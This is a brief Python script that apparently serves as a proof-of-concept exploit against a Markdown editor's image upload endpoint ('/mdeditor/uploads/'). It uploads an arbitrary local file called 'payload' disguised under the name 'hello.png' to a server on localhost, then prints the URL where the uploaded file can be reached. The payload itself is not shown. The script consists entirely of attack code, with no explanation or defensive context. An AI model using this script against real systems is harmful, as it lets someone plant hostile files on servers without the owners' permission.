import requests
import json

TARGET = "http://localhost:8000"
files  = {'editormd-image-file' : ('hello.png', open('payload', 'rb').read())}
r = requests.post(TARGET + "/mdeditor/uploads/", files=files)
print(r.text)
print(TARGET + json.loads(r.text)['url'])